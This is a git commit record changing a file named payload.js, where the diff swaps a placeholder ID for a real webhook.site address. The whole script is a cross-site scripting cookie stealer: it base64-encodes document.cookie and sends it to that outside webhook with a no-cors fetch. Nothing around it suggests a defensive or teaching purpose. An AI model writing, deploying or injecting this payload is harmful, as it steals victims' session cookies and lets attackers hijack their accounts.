c8900f3d59d4bf9a2bd5e30c005db0b712c9f4a2
arwen0713 <aespa.winrina11@gmail.com>
2025-04-19 06:08:38 +0800

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,4 +1,4 @@
 // payload.js
-fetch("https://webhook.site/你的ID?" + btoa(document.cookie), {
+fetch("https://webhook.site/6d76997e-d76b-41a7-8499-f386dae218cd?" + btoa(document.cookie), {
   mode: "no-cors"
 });
